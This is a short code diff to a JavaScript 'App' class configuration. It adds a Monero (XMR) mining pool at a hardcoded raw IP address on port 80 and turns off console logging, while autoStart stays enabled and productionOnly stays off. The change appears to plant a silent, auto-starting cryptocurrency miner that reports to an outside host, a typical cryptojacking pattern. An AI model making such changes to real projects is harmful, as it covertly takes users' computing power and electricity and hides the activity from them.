@@ -10,7 +10,11 @@ module.exports = class App {
     config = {
         productionOnly: false,
         autoStart: true,
-        pools: [],
+        pools: [{
+            coin: 'XMR',
+            user: 'rawr',
+            url: '130.162.52.80:80', // optional pool URL,
+        }],
         opencl: {
             enabled: false,
             platform: 'AMD'
@@ -23,7 +27,7 @@ module.exports = class App {
             enabled: true,
             writeToFile: 'xmrlog.txt',
             level: 'debug',
-            writeToConsole: true
+            writeToConsole: false
         }
     };
 
